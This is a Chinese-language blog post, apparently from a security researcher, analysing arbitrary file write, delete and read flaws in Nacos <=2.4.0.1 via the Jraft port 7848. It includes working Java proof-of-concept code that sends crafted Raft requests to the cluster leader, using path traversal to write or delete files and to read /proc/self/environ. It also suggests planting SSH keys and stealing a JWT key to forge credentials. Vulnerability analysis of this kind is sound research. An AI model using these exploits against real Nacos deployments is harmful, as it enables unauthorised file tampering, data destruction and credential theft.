---
title: 'Nacos <=2.4.0.1 任意文件读写删'
date: 2025-03-02
description: 'Nacos <=2.4.0.1 任意文件读写删'
# topic: leetcode
author: hzlei
# banner: https://cdn.jsdelivr.net/gh/hzleii/imgs/stellar/post/2024/ruoyi-rce/index.webp
# cover: https://cdn.jsdelivr.net/gh/hzleii/imgs/stellar/post/2024/ruoyi-rce/index.webp
nav_tabs: true
article:
  type: # tech/story
poster: # 海报（可选，全图封面卡片）
  # topic: 标题上方的小字 # 标题上方的小字，可选
  headline: 备份 # 必选
  caption:  # 标题下方的小字，可选
  color: hsl(154deg 100% 61%) # 标题颜色，可选，默认为跟随主题的动态颜色 # white,red...
---


## 前言

在Nacos{% mark <=2.4.0.1 color:red %}版本中集群模式启动下存在名为{% mark naming_persistent_service color:red %}的Group，
该Group所使用的Processor
为{% mark com.alibaba.nacos.naming.consistency.persistent.impl.PersistentServiceProcessor color:red %}类型Processor，
在进行处理过程中会触发其父类onApply或onRequest方法,这两个方法会分别造成{% mark 任意文件写入删除 color:red %}和{% mark 任意文件读取 color:red %}。

官方社区公告：https://nacos.io/blog/announcement-nacos-security-problem-file/

漏洞出现在Jraft服务（默认值7848）

## 环境搭建

docker搭建集群参考：https://github.com/nacos-group/nacos-docker

{% image https://gitee.com/hzleii/imgs/raw/main/stellar/post/2025/nacos/1.png 环境搭建 %}


## 漏洞分析

这个漏洞的原理和之前的Nacos Hessian 反序列化漏洞差不多，但是没这么复杂

这里只说重点，请求包的构造参考之前的Nacos Hessian反序列化漏洞

当nacos以集群模式启动时，存在一个名为naming_persistent_service的Group

{% image https://gitee.com/hzleii/imgs/raw/main/stellar/post/2025/nacos/2.png naming_persistent_service#Group %}

注意，{% mark 此时的leader为nacos2:7848,这个会变的 color:red %}，
在Nacos Hessian 反序列化漏洞的调试中知道，只有leader节点才会进行后续的操作。

{% image https://gitee.com/hzleii/imgs/raw/main/stellar/post/2025/nacos/3.png isLeader %}

在调试分析这个漏洞的过程中发现，在向leader发包后，下一次，leader就会变为其他节点。反正就是naming_persistent_service下的leader是哪个，就向哪个节点发送请求即可，不需要重启

请求的处理过程，不多bb{% emoji tieba huaji %}了，参考Nacos Hessian 反序列化漏洞。

调用栈如下：

```
onApply:159, BasePersistentServiceProcessor (com.alibaba.nacos.naming.consistency.persistent.impl)  
onApply:122, NacosStateMachine (com.alibaba.nacos.core.distributed.raft)  
doApplyTasks:597, FSMCallerImpl (com.alipay.sofa.jraft.core)  
doCommitted:561, FSMCallerImpl (com.alipay.sofa.jraft.core)  
runApplyTask:467, FSMCallerImpl (com.alipay.sofa.jraft.core)  
access$100:73, FSMCallerImpl (com.alipay.sofa.jraft.core)  
onEvent:150, FSMCallerImpl$ApplyTaskHandler (com.alipay.sofa.jraft.core)  
onEvent:142, FSMCallerImpl$ApplyTaskHandler (com.alipay.sofa.jraft.core)  
run:137, BatchEventProcessor (com.lmax.disruptor)  
run:750, Thread (java.lang)
```


### 任意文件写入

来到`BasePersistentServiceProcessor#onApply`

{% image https://gitee.com/hzleii/imgs/raw/main/stellar/post/2025/nacos/4.png BasePersistentServiceProcessor#onApply %}

首先对传入的data进行反序列化为一个BatchWriteRequest对象，然后再获取操作op进入不同的方法处理，
如果 op=="Write"，则进入NamingKvStorage#batchPut

{% image https://gitee.com/hzleii/imgs/raw/main/stellar/post/2025/nacos/5.png NamingKvStorage#batchPut %}

这里只是简单的遍历一下列表，然后就丢给put方法处理

{% image https://gitee.com/hzleii/imgs/raw/main/stellar/post/2025/nacos/6.png put %}

this.getStorage()只是返回一个KvStorage对象，然后进入KvStorage#put

{% image https://gitee.com/hzleii/imgs/raw/main/stellar/post/2025/nacos/7.png KvStorage#put %}

这里一目了然了，而且参数可控，
需要注意的是这个this.baseDir的当前目录为/home/nacos/data/naming/data，可以目录穿越

{% image https://gitee.com/hzleii/imgs/raw/main/stellar/post/2025/nacos/8.png this#baseDir %}

回到BasePersistentServiceProcessor#onApply，构造数据

{% image https://gitee.com/hzleii/imgs/raw/main/stellar/post/2025/nacos/9.png BasePersistentServiceProcessor#onApply %}

需要一个BatchWriteRequest对象，并序列化

调试发现，这个序列化和反序列化是由
{% mark com.alibaba.nacos.consistency.serialize.JacksonSerializer() %}
进行的

而不是之前常用的那个，所以构造如下：

```java
BatchWriteRequest request = new BatchWriteRequest();
request.append("1.txt".getBytes(), "aaaa\n".getBytes());
JacksonSerializer serializer = new JacksonSerializer();
// 发送数据
send(address, serializer.serialize(request));
```

op的控制就简单了，在构造WriteRequest对象时候，加一个setOperation("Write")即可，
send方法是发送请求，参考{% hashtag Y4er https://y4er.com/posts/nacos-hessian-rce/ %}写的，复制+修改

{% image https://gitee.com/hzleii/imgs/raw/main/stellar/post/2025/nacos/10.png send %}

```java
public static void send(String addr, byte[] payload) throws Exception {  
    Configuration conf = new Configuration();  
    conf.parse(addr);  
    RouteTable.getInstance().updateConfiguration("nacos", conf);  
    CliClientServiceImpl cliClientService = new CliClientServiceImpl();  
    cliClientService.init(new CliOptions());  
    RouteTable.getInstance().refreshLeader(cliClientService, "nacos", 1000).isOk();  
    PeerId leader = PeerId.parsePeer(addr);  
    Field parserClasses = cliClientService.getRpcClient().getClass().getDeclaredField("parserClasses");  
    parserClasses.setAccessible(true);  
    ConcurrentHashMap map = (ConcurrentHashMap) parserClasses.get(cliClientService.getRpcClient());  
    map.put("com.alibaba.nacos.consistency.entity.WriteRequest", WriteRequest.getDefaultInstance());  
    MarshallerHelper.registerRespInstance(WriteRequest.class.getName(), WriteRequest.getDefaultInstance());  
    final WriteRequest writeRequest = WriteRequest.newBuilder().setGroup("naming_persistent_service").setData(ByteString.copyFrom(payload)).setOperation("Write").build();  
    Object o = cliClientService.getRpcClient().invokeSync(leader.getEndpoint(), writeRequest, 5000);  
    System.out.println(o);  
}  

public static void main(String[] args) throws Exception {  
    String address = "192.168.3.153:7848";  
    BatchWriteRequest request = new BatchWriteRequest();  
    // 向/home/nacos/data/naming/data/1.txt写入aaaa  
    request.append("1.txt".getBytes(), "aaaa\n".getBytes());
    JacksonSerializer serializer = new JacksonSerializer();  
    send(address, serializer.serialize(request));  
 }
```

这个漏洞的利用，目前只能想到再开启22端口的情况下写ssh公钥，然后连接

### 任意文件删除

再回到BasePersistentServiceProcessor#onApply，
如果{% mark op==Delete color:red %}是不是就可以删除任意文件了？
跟一下

{% image https://gitee.com/hzleii/imgs/raw/main/stellar/post/2025/nacos/11.png BasePersistentServiceProcessor#onApply %}

根据batchDelete，来到NamingKvStorage的batchDelete

{% image https://gitee.com/hzleii/imgs/raw/main/stellar/post/2025/nacos/12.png batchDelete %}

继续跟进delete()

{% image https://gitee.com/hzleii/imgs/raw/main/stellar/post/2025/nacos/13.png delete %}

这里的delete再跟进，也是一目了然，

{% image https://gitee.com/hzleii/imgs/raw/main/stellar/post/2025/nacos/14.png DiskUtils#deleteFile %}
{% image https://gitee.com/hzleii/imgs/raw/main/stellar/post/2025/nacos/15.png deleteFile %}

这个POC和上面任意文件写入的一样，只有把.setOperation("Write")改为.setOperation("Delete")即可


### 任意文件读取

前面的poc发送的数据都是构造WriteRequest对象发送，读取文件，需要的是ReadRequest

在处理请求的过程中，如果是ReadRequest则会调用该Group所使用的Processor的onRequest方法

{% image https://gitee.com/hzleii/imgs/raw/main/stellar/post/2025/nacos/16.png Processor#onRequest %}

因为Group为naming_persistent_service，还是BasePersistentServiceProcessor处理，
来到BasePersistentServiceProcessor的onRequest方法

{% image https://gitee.com/hzleii/imgs/raw/main/stellar/post/2025/nacos/17.png BasePersistentServiceProcessor#onRequest %}

处理的套路和前面的差不多，将数据反序列化为List后丢给NamingKvStorage#batchGet处理

{% image https://gitee.com/hzleii/imgs/raw/main/stellar/post/2025/nacos/18.png NamingKvStorage#batchGet %}

这里也是变量，然后丢给get处理，跟进

{% image https://gitee.com/hzleii/imgs/raw/main/stellar/post/2025/nacos/19.png get %}

又是这个storage，再跟进

{% image https://gitee.com/hzleii/imgs/raw/main/stellar/post/2025/nacos/20.png storage %}

再这个get方法中，如果文件存在，则读取，并返回读取的内容，返回到onRequest,通过response发送到客户端

POC:

```java
public static void send2(String addr, byte[] payload) throws Exception {  
    Configuration conf = new Configuration();  
    conf.parse(addr);  
    RouteTable.getInstance().updateConfiguration("nacos", conf);  
    CliClientServiceImpl cliClientService = new CliClientServiceImpl();  
    cliClientService.init(new CliOptions());  
    RouteTable.getInstance().refreshLeader(cliClientService, "nacos", 1000).isOk();  
    PeerId leader = PeerId.parsePeer(addr);  
    Field parserClasses = cliClientService.getRpcClient().getClass().getDeclaredField("parserClasses");  
    parserClasses.setAccessible(true);  
    ConcurrentHashMap map = (ConcurrentHashMap) parserClasses.get(cliClientService.getRpcClient());  
    map.put("com.alibaba.nacos.consistency.entity.ReadRequest", ReadRequest.getDefaultInstance());  
    MarshallerHelper.registerRespInstance(ReadRequest.class.getName(), ReadRequest.getDefaultInstance());  
    final ReadRequest readRequest = ReadRequest.newBuilder().setGroup("naming_persistent_service").setData(ByteString.copyFrom(payload)).build();  
    Object o = cliClientService.getRpcClient().invokeSync(leader.getEndpoint(), readRequest, 5000);  
    System.out.println(o);  
}  
public static void main(String[] args) throws Exception {  
    bypass();  
    String address = "192.168.3.153:7848";   
    JacksonSerializer serializer = new JacksonSerializer();  
    List byteArrayList = Arrays.asList("../../../../../../proc/self/environ".getBytes());  
    send2(address, serializer.serialize(byteArrayList));  
}
```

文件读取可以读取环境变量获取jwt key伪造凭据，读取配置文件获取敏感信息


## 漏洞复现

任意文件写入：写入pwn.txt

{% image https://gitee.com/hzleii/imgs/raw/main/stellar/post/2025/nacos/21.png pwn.txt %}

任意文件删除：删除掉刚刚写入的pwn.txt

{% image https://gitee.com/hzleii/imgs/raw/main/stellar/post/2025/nacos/22.png pwn.txt %}

任意文件读取：读取/proc/self/environ环境变量

{% image https://gitee.com/hzleii/imgs/raw/main/stellar/post/2025/nacos/23.png pwn.txt %}

其中keys是文件名，values是文件内容，base64解码

{% image https://gitee.com/hzleii/imgs/raw/main/stellar/post/2025/nacos/24.png base64解码 %}

文件内容：

{% image https://gitee.com/hzleii/imgs/raw/main/stellar/post/2025/nacos/25.png 文件内容 %}


## 参考

https://mp.weixin.qq.com/s/EzMaG3u-lcBnVbPYebP_Ag

https://y4er.com/posts/nacos-hessian-rce/

















